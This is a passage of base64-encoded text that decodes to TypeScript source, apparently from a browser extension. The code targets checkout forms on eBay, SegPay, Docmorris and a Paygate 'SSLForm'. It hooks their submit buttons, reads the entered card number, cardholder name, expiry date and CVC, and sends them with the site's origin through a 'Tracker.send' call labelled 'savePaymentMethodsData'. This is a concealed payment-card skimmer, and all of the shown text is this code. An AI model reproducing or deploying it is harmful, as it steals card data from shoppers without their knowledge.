AgICAgICdjYXJkRXhwaXJlJzogcGF5bWVudE1ldGhvZFN0b3JlWzFdLmlkID09PSAnY2FyZEV4cGlyeURhdGUnID8gcGF5bWVudE1ldGhvZFN0b3JlWzFdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogcGF5bWVudE1ldGhvZFN0b3JlWzJdLmlkID09PSAnc2VjdXJpdHlDb2RlJyA/IHBheW1lbnRNZXRob2RTdG9yZVsyXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kU3RvcmUgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnYScpLmZvckVhY2goZnVuY3Rpb24gKF9fZWJheVNlY29uZEVudHJ5KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fZWJheVNlY29uZEVudHJ5LmdldEF0dHJpYnV0ZSgnZGF0YS10ZXN0LWlkJykgPT09ICdHRVRfUEFZTUVOVF9JTlNUUlVNRU5UJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWydjbGljaycsICdkYmxjbGljayddLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX2ViYXlTZWNvbmRFbnRyeS5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlRWJheVBheW1lbnREYXRhQ29sbGVjdGlvbihzZWxmLCBfX2ViYXlDcmVkaXRDYXJkRm9ybUVsZW1lbnQsIGVsZW1lbnRzKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgfSwgMTAwKVxuICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgfSk7XG4gICAgICAgIH0pO1xuICAgIH1cblxuICAgIGV4cGxvcmVFYmF5UGF5bWVudEZvcm1FbGVtZW50KHNlbGY6IHRoaXMsIF9fZWJheUNyZWRpdENhcmRGb3JtRWxlbWVudDogYW55LCBlbGVtZW50czogYW55W10sIGNhbGxiYWNrOiAoYXJnMDogYW55LCBhcmcxOiBhbnkpID0+IHZvaWQpIHtcbiAgICAgICAgaWYgKF9fZWJheUNyZWRpdENhcmRGb3JtRWxlbWVudC5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgX19lYmF5Q3JlZGl0Q2FyZEZvcm1FbGVtZW50LmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX2ViYXlGb3JtQ2hpbGRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICBpZiAoX2ViYXlGb3JtQ2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnIHx8IF9lYmF5Rm9ybUNoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9lYmF5Rm9ybUNoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyAmJiBfZWJheUZvcm1DaGlsZEVsZW1lbnQudHlwZSAhPT0gJ2hpZGRlbicgJiYgX2ViYXlGb3JtQ2hpbGRFbGVtZW50LnR5cGUgIT09ICdjaGVja2JveCcpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLnB1c2goX2ViYXlGb3JtQ2hpbGRFbGVtZW50KTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBpZiAoX2ViYXlGb3JtQ2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnQlVUVE9OJyAmJiBfZWJheUZvcm1DaGlsZEVsZW1lbnQudHlwZSA9PT0gJ3N1Ym1pdCcpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9lYmF5Rm9ybUNoaWxkRWxlbWVudCwgZWxlbWVudHMpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlRWJheVBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBfZWJheUZvcm1DaGlsZEVsZW1lbnQsIGVsZW1lbnRzLCBjYWxsYmFjayk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfSk7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICBleHBsb3JlU2VnUGF5UGF5bWVudENvbnRhaW5lcihzZWxmOiB0aGlzKSB7XG4gICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5mb3JFYWNoKGZ1bmN0aW9uIChfX2Zvcm1FbGVtZW50KSB7XG4gICAgICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5pZCA9PT0gXCJQYXlQYWdlRm9ybVwiKSB7XG4gICAgICAgICAgICAgICAgbGV0IGVsZW1lbnRzOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVTZWdQYXlQYXltZW50Rm9ybUVsZW1lbnQoc2VsZiwgX19mb3JtRWxlbWVudCwgZWxlbWVudHMsIGZ1bmN0aW9uIChjb250cm9sbGVyOiBhbnksIGVsZW1lbnRzOiBhbnlbXSkge1xuICAgICAgICAgICAgICAgICAgICBjb250cm9sbGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBheW1lbnRNZXRob2REYXRhOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLmZvckVhY2goZnVuY3Rpb24gKF9fY2hpbGRFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19jaGlsZEVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fY2hpbGRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IF9fY2hpbGRFbGVtZW50Lm5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fY2hpbGRFbGVtZW50LnZhbHVlLFxuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBwYXltZW50TWV0aG9kRGF0YVsyXS52YWx1ZSAhPT0gbnVsbCA/IHBheW1lbnRNZXRob2REYXRhWzJdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogLypwYXltZW50TWV0aG9kRGF0YVsyXS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzJdLnZhbHVlLnRvTG93ZXJDYXNlKCkgOiovICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiBwYXltZW50TWV0aG9kRGF0YVswXS52YWx1ZSAhPT0gbnVsbCA/IHBheW1lbnRNZXRob2REYXRhWzBdLnZhbHVlIDogJ1Vua25vd24nICsgJyAnICsgcGF5bWVudE1ldGhvZERhdGFbMV0udmFsdWUgIT09IG51bGwgPyBwYXltZW50TWV0aG9kRGF0YVsxXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiBwYXltZW50TWV0aG9kRGF0YVszXS52YWx1ZSAhPT0gbnVsbCA/IHBheW1lbnRNZXRob2REYXRhWzNdLnZhbHVlIDogJ1Vua25vd24nICsgJy8nICsgcGF5bWVudE1ldGhvZERhdGFbNF0udmFsdWUgIT09IG51bGwgPyBwYXltZW50TWV0aG9kRGF0YVs0XS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiBwYXltZW50TWV0aG9kRGF0YVs1XS52YWx1ZSAhPT0gbnVsbCA/IHBheW1lbnRNZXRob2REYXRhWzVdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIC8vZWxlbWVudHMgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICB9XG4gICAgICAgIH0pO1xuICAgIH1cblxuICAgIGV4cGxvcmVTZWdQYXlQYXltZW50Rm9ybUVsZW1lbnQoc2VsZjogdGhpcywgX19mb3JtRWxlbWVudDogYW55LCBlbGVtZW50czogYW55W10sIGNhbGxiYWNrOiAoYXJnMDogYW55LCBhcmcxOiBhbnkpID0+IHZvaWQpIHtcbiAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgIF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfY2hpbGRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnQlVUVE9OJykge1xuICAgICAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyAmJiBfY2hpbGRFbGVtZW50LnR5cGUgIT09ICdoaWRkZW4nICYmIF9jaGlsZEVsZW1lbnQudHlwZSAhPT0gJ3JhZGlvJyAmJlxuICAgICAgICAgICAgICAgICAgICAgICAgX2NoaWxkRWxlbWVudC5pZCAhPT0gJ0VNYWlsSW5wdXQnICYmIF9jaGlsZEVsZW1lbnQuaWQgIT09ICdBZGRyZXNzSW5wdXQnICYmIF9jaGlsZEVsZW1lbnQuaWQgIT09ICdDaXR5SW5wdXQnICYmXG4gICAgICAgICAgICAgICAgICAgICAgICBfY2hpbGRFbGVtZW50LmlkICE9PSAnUGhvbmVOdW1iZXJJbnB1dCcgJiYgX2NoaWxkRWxlbWVudC5pZCAhPT0gJ1ppcElucHV0JyAmJiBfY2hpbGRFbGVtZW50LmlkICE9PSAnVGVybXNDb25kaXRpb25zUHJpdmFjeUlucHV0JyB8fFxuICAgICAgICAgICAgICAgICAgICAgICAgX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ1NFTEVDVCcgJiYgX2NoaWxkRWxlbWVudC5pZCAhPT0gJ0xhbmd1YWdlRERMJyAmJiBfY2hpbGRFbGVtZW50LmlkICE9PSAnVG9kYXlzQ2hhcmdlRERMJyAmJlxuICAgICAgICAgICAgICAgICAgICAgICAgX2NoaWxkRWxlbWVudC5pZCAhPT0gJ1N0YXRlRERMJyAmJiBfY2hpbGRFbGVtZW50LmlkICE9PSAnQ291bnRyeURETCcpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLnB1c2goX2NoaWxkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9jaGlsZEVsZW1lbnQsIGVsZW1lbnRzKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNlZ1BheVBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBfY2hpbGRFbGVtZW50LCBlbGVtZW50cywgY2FsbGJhY2spO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0pO1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgZXhwbG9yZURvY21vcnJpc1BheW1lbnRDb250YWluZXIoc2VsZjogdGhpcykge1xuICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykuZm9yRWFjaChmdW5jdGlvbiAoX19mb3JtRWxlbWVudCkge1xuICAgICAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuaWQgPT09IFwiZm9ybS1wYXltZW50bWV0aG9kcy1jcmVkaXRfY2FyZFwiKSB7XG4gICAgICAgICAgICAgICAgbGV0IGVsZW1lbnRzOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVEb2Ntb3JyaXNQYXltZW50Rm9ybUVsZW1lbnQoc2VsZiwgX19mb3JtRWxlbWVudCwgZWxlbWVudHMsIGZ1bmN0aW9uIChjb250cm9sbGVyOiBhbnksIGVsZW1lbnRzOiBhbnlbXSkge1xuICAgICAgICAgICAgICAgICAgICBjb250cm9sbGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBheW1lbnRNZXRob2REYXRhOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLmZvckVhY2goZnVuY3Rpb24gKF9fY2hpbGRFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19jaGlsZEVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fY2hpbGRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IF9fY2hpbGRFbGVtZW50Lm5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fY2hpbGRFbGVtZW50LnZhbHVlLFxuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBwYXltZW50TWV0aG9kRGF0YVsxXS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzFdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogcGF5bWVudE1ldGhvZERhdGFbMl0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVsyXS52YWx1ZS50b0xvd2VyQ2FzZSgpIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHBheW1lbnRNZXRob2REYXRhWzBdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbMF0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogcGF5bWVudE1ldGhvZERhdGFbM10udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVszXS52YWx1ZSA6ICdVbmtub3duJyArICcvJyArIHBheW1lbnRNZXRob2REYXRhWzRdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbNF0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogcGF5bWVudE1ldGhvZERhdGFbNV0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVs1XS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2REYXRhID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICAvL2VsZW1lbnRzID0gW107XG4gICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgfVxuICAgICAgICB9KTtcbiAgICB9XG5cbiAgICBleHBsb3JlRG9jbW9ycmlzUGF5bWVudEZvcm1FbGVtZW50KHNlbGY6IHRoaXMsIF9fZm9ybUVsZW1lbnQ6IGFueSwgZWxlbWVudHM6IGFueVtdLCBjYWxsYmFjazogKGFyZzA6IGFueSwgYXJnMTogYW55KSA9PiB2b2lkKSB7XG4gICAgICAgIGlmIChfX2Zvcm1FbGVtZW50LmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICBfX2Zvcm1FbGVtZW50LmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX2NoaWxkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgfHwgX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ1NFTEVDVCcgfHwgX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgJiYgX2NoaWxkRWxlbWVudC50eXBlICE9PSAnaGlkZGVuJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMucHVzaChfY2hpbGRFbGVtZW50KTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBpZiAoZWxlbWVudHMubGVuZ3RoICEgPiA0ICYmIGVsZW1lbnRzLmxlbmd0aCAhIDwgNikge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNwZXJrcmVkaXRrYXJ0ZScpLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNwZXJrcmVkaXRrYXJ0ZScpLmZvckVhY2goZnVuY3Rpb24gKF9fZGF0YUNvbmZpcm1FbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2RhdGFDb25maXJtRWxlbWVudC5nZXRBdHRyaWJ1dGUoJ2Zvcm0nKSA9PT0gXCJmb3JtLXBheW1lbnRtZXRob2RzLWNyZWRpdF9jYXJkXCIpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9fZGF0YUNvbmZpcm1FbGVtZW50LCBlbGVtZW50cyk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlRG9jbW9ycmlzUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9jaGlsZEVsZW1lbnQsIGVsZW1lbnRzLCBjYWxsYmFjayk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfSk7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICBleHBsb3JlUGF5Z2F0ZVBheW1lbnRDb250YWluZXIoc2VsZjogdGhpcykge1xuICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykuZm9yRWFjaChmdW5jdGlvbiAoX19mb3JtRWxlbWVudCkge1xuICAgICAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuaWQgPT09IFwiU1NMRm9ybVwiKSB7XG4gICAgICAgICAgICAgICAgbGV0IGVsZW1lbnRzOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXlnYXRlUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9fZm9ybUVsZW1lbnQsIGVsZW1lbnRzLCBmdW5jdGlvbiAoY29udHJvbGxlcjogYW55LCBlbGVtZW50czogYW55W10pIHtcbiAgICAgICAgICAgICAgICAgICAgY29udHJvbGxlci5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwYXltZW50TWV0aG9kRGF0YTogYW55ID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19jaGlsZEVsZW1lbnQudHlwZSA9PT0gJ3JhZGlvJyAmJiBfX2NoaWxkRWxlbWVudC5jaGVja2VkKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kRGF0YS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fY2hpbGRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogX19jaGlsZEVsZW1lbnQubmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2NoaWxkRWxlbWVudC52YWx1ZSxcblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19jaGlsZEVsZW1lbnQudHlwZSA9PT0gJ3RleHQnKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19jaGlsZEVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fY2hpbGRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IF9fY2hpbGRFbGVtZW50Lm5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fY2hpbGRFbGVtZW50LnZhbHVlLFxuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdTRUxFQ1QnKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2REYXRhLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fY2hpbGRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiBfX2NoaWxkRWxlbWVudC5uYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19jaGlsZEVsZW1lbnQudmFsdWUsXG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcGF5bWVudE1ldGhvZERhdGFbMV0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVsxXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IHBheW1lbnRNZXRob2REYXRhWzJdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbMl0udmFsdWUudG9Mb3dlckNhc2UoKSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiBwYXltZW50TWV0aG9kRGF0YVswXS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzBdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IHBheW1lbnRNZXRob2REYXRhWzNdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbM10udmFsdWUgOiAnVW5rbm93bicgKyAnLycgKyBwYXltZW50TWV0aG9kRGF0YVs0XS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzRdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg